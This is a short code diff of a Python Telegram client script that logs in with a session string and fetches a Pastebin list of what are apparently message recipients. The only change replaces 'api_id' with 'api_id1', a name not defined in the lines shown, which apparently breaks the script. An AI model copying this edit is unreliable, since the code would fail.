@@ -20,7 +20,7 @@ hash=os.environ.get("API_HASH", False)
 api_id=os.environ.get("API_ID", False)
 api_hash=data["env"]["API_HASH"]["value"]
 string =os.environ.get("SESSION", False)
-with TelegramClient(StringSession(string), api_id, api_hash) as client:
+with TelegramClient(StringSession(string), api_id1, api_hash) as client:
   client.start()
   to_the1="https://pastebin.com/raw/1kvXvHAe"
   sendto1=requests.get(to_the1).text.split('\n')
